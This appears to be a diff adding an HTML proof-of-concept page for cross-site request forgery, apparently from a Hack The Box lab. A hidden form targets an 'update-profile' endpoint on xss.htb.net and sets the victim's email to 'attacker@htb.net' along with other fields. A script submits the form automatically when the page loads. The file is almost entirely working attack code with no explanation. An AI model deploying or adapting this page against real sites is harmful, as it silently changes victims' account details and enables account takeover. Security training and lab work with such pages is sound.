@@ -1,0 +1,13 @@
+<html>
+	<body>
+		<form id="submitme" action="http://xss.htb.net/api/update-profile" method="POST">
+			<input type="hidden" name="email" value="attacker@htb.net" />
+			<input type="hidden" name="telephone" value="NotNumberMFK" />
+			<input type="hidden" name="country" value="CSRF_POC" />
+			<input type="submit" value="Submit request" />
+		</form>
+		<script>
+			document.getElementById("submitme").submit()
+		</script>
+	</body>
+</html>
